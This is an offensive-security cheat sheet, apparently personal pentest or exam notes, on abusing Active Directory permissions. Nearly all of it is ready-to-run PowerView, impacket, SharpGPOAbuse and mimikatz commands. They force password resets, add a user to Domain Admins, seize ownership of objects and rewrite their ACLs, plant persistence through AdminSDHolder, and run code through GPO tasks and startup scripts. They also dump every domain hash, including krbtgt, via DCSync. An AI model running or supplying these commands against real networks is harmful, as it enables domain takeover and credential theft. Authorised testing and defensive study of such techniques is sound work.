# Active Directory ACL Abuse

## Overview

Active Directory ACLs (Access Control Lists) define permissions on AD objects. Abuse arises when a controlled principal has excessive privileges on a target object (user, group, computer, domain).

---

## GenericAll

Full control over an AD object -- every attribute and operation.

### GenericAll on User

```powershell
# PowerView: Find GenericAll
Get-ObjectAcl -ResolveGUIDs -SamAccountName <target_user>
```

```bash
# Change user's password directly
impacket-smbpasswd <domain>/<target_user>@<DC> -newpass <NewPassword> -oldpass ''

# Using PowerView
Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString '<NewPass>' -AsPlainText -Force)
```

### GenericAll on Group

```powershell
# Add user to Domain Admins
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<controlled_user>'

# Check membership
Get-ADGroupMember -Identity 'Domain Admins'

# Remove after access
Remove-DomainGroupMember -Identity 'Domain Admins' -Members '<controlled_user>'
```

### GenericAll on Computer

```powershell
# If GenericAll on a computer object, you can perform resource-based constrained delegation ([[Kerberos Delegation]])
Set-ADComputer -Identity <target_computer> -PrincipalsAllowedToDelegateToAccount <controlled_computer>

# RBCD abuse
# See: [[AD Domain Dominance#Kerberos Delegation]]
```

---

## WriteOwner

Change the owner of an AD object. Owner can modify object's ACL.

```powershell
# Set owner to controlled user
Set-DomainObjectOwner -Identity <target_object> -OwnerIdentity <controlled_user>

# Now as owner, modify ACLs
Add-DomainObjectAcl -TargetIdentity <target_object> -PrincipalIdentity <controlled_user> -Rights FullControl

# Add user to group after taking ownership
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<controlled_user>'
```

```bash
# Using impacket
impacket-owneredit -action write -owner <controlled_user> -target <target_group> <domain>/<user>:<password>
```

---

## WriteDACL

Ability to modify the ACL (DACL) of an object, granting yourself rights.

```powershell
# Add GenericAll to self on target object
Add-DomainObjectAcl -TargetIdentity <target_object> -PrincipalIdentity <controlled_user> -Rights FullControl

# Add user to group with WriteDACL on the group
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity <controlled_user> -Rights FullControl
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<controlled_user>'
```

---

## ForceChangePassword

Reset another user's password without knowing the current password.

### PowerView

```powershell
# Force change password
Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString '<NewPassword>' -AsPlainText -Force) -Verbose

# Verify
$cred = New-Object System.Management.Automation.PSCredential("<domain>\\<target_user>",(ConvertTo-SecureString '<NewPassword>' -AsPlainText -Force))
Get-DomainUser -Credential $cred
```

### impacket

```bash
impacket-smbpasswd <domain>/<target_user>@<DC> -newpass <NewPassword> -oldpass ''

# Alternative (net rpc)
net rpc password <target_user> '<NewPassword>' -U <domain>/<controlled_user>%<password> -S <DC>
```

---

## AdminSDHolder Abuse

The AdminSDHolder container's ACL propagates to all protected AD accounts and groups (adminCount=1). If you have Write on AdminSDHolder, you get persistence on all privileged objects.

```powershell
# Check current AdminSDHolder permissions
Get-ObjectAcl -ADSPath "CN=AdminSDHolder,CN=System,DC=<domain>,DC=<local>" -ResolveGUIDs

# Add FullControl for a user on AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=<domain>,DC=<local>" -PrincipalIdentity <controlled_user> -Rights FullControl -Verbose

# Wait for SDProp timer (60 min default) or force:
# Force SDProp by changing a schema cache value (not recommended during exam)
# Microsoft: SDProp runs every 60 minutes on PDC emulator
```

### AdminSDHolder Propagation

```powershell
# Users/groups with adminCount >= 1 (protected)
Get-DomainUser -AdminCount
Get-DomainGroup -AdminCount

# These are affected:
# - Domain Admins
# - Enterprise Admins
# - Schema Admins
# - Administrators
# - Backup Operators
# - Account Operators
# - Server Operators
# - Print Operators
# - Domain Controllers
# - Cert Publishers
# - Read-only Domain Controllers (RODC)
```

```bash
# Check adminCount objects via LDAP
ldapsearch -H ldap://<DC> -x -D "<user>@<domain>" -w '<password>' -b "DC=<domain>,DC=<local>" "(adminCount=1)"
```

---

## GPO Abuse

If you have Write access (GenericWrite, GenericAll, WriteDACL, etc.) on a GPO that applies to a target computer/user, you can modify it to execute code.

### SharpGPOAbuse

```powershell
# Add a user to local admin via GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author <domain>\\<user> --Command "cmd" --Arguments "/c net localgroup Administrators <domain>\\<controlled_user> /add" --GPOName "Vulnerable GPO"

# Or via registry: startup script
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <domain>\\<controlled_user> --GPOName "Vulnerable GPO"

# Immediate scheduled task via GPO
SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Author <domain>\\<user> --Command "powershell" --Arguments "-Enc <base64>" --GPOName "Vulnerable GPO"

# Force GP update on target
gpupdate /force
# or wait for automatic refresh (every 90 min)
```

### PowerView GPO Enumeration

```powershell
# Find GPOs where our user has permissions
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

# Find GPOs applied to specific OU
Get-NetGPO -ComputerIdentity <computer>
Get-DomainGPO -ComputerIdentity <computer>

# Find computers where a specific GPO applies
Get-DomainOU -GPLink '<GPO_DN>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
```

### Manual GPO Abuse (SMB)

```bash
# If writable GPO folder is accessible via SYSVOL
# Mount SYSVOL
mount -t cifs //<DC>/SYSVOL /mnt/sysvol -o user=<user>

# Navigate to GPO directory
cd /mnt/sysvol/<domain>/Policies/<GPO_GUID>/Machine/
cd /mnt/sysvol/<domain>/Policies/<GPO_GUID>/User/

# Modify scripts
echo "net localgroup Administrators <domain>\\<user> /add" > Scripts/Startup/script.bat
# Force GP update
gpupdate /force
```

---

## DCSync

Replicate domain data (including password hashes) from a DC. Requires `Replicating Directory Changes` rights (often held by Domain Admins, Enterprise Admins, and sometimes delegated).

```bash
# Impacket secretsdump
impacket-secretsdump -just-dc <domain>/<user>:<password>@<DC>
impacket-secretsdump -just-dc <domain>/<user>@<DC> -hashes <LM>:<NT>

# Dump all (includes SAM, LSA cached)
impacket-secretsdump -just-dc-ntlm <domain>/<user>:<password>@<DC>

# Dump only specific user
impacket-secretsdump -just-dc-user <target_user> <domain>/<user>:<password>@<DC>

# DCSync all users to file
impacket-secretsdump -just-dc -outputfile dc_sync <domain>/<user>:<password>@<DC>
```

### Mimikatz DCSync

```powershell
# DCSync krbtgt (needed for [[Golden Ticket]])
mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt

# DCSync specific user
mimikatz # lsadump::dcsync /domain:<domain> /user:<target_user>

# DCSync all (requires admin but uses replication)
mimikatz # lsadump::dcsync /domain:<domain> /all
```

### Check DCSync Rights

```powershell
# PowerView: Check who has replication rights
Get-ObjectAcl -ResolveGUIDs -SamAccountName "Domain Admins" | ? {$_.ActiveDirectoryRights -match "ExtendedRight"}

# ADModule
Get-ADObject -Identity "DC=<domain>,DC=<local>" -Properties ntSecurityDescriptor
```

---

## Key ACL Primitives Summary

| ACE Right | Effect | Example Attack |
|-----------|--------|----------------|
| `GenericAll` | Full control over object | Change password, add to group |
| `GenericWrite` | Modify attributes | Set SPN for [[Kerberoasting]], weaken ACL |
| `WriteProperty` | Write specific attributes | Dependent on property |
| `WriteOwner` | Change ownership | Then modify ACL as owner |
| `WriteDACL` | Modify ACL | Grant self any right |
| `ForceChangePassword` | Reset password | Takeover user account |
| `Self` (Add/Remove Self) | Add/remove self from group | Join Domain Admins |
| `ExtendedRight` | Application-specific right | [[DCSync]] (lies in Extension) |

---

## Finding Abusable ACLs

### PowerView

```powershell
# Find dangerous ACLs for our user
Find-InterestingDomainAcl -ResolveGUIDs

# Specific object ACLs
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs

# Recursive ACL search
Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $user_sid}

# Convert SID to name
Convert-SidToName <SID>
```

### BloodHound

```cypher
// Find ACL abuse paths for our user
MATCH p = (u:User {name:"<USER>@<DOMAIN>"})-[r:GenericAll|WriteOwner|WriteDACL|GenericWrite|ForceChangePassword|AllExtendedRights]->(target) RETURN p

// Shortest ACL abuse paths to DA
MATCH p = shortestPath((u:User {name:"<USER>@<DOMAIN>"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"})) WHERE ALL(r IN relationships(p) WHERE type(r) IN ["MemberOf","GenericAll","WriteOwner","WriteDACL","GenericWrite","ForceChangePassword","AllExtendedRights","AddMember"]) RETURN p
```

---

## Related Notes

- [[AD Recon Enumeration]]
- [[AD Attack Vectors]]
- [[AD Lateral Movement]]
- [[AD Domain Dominance]]
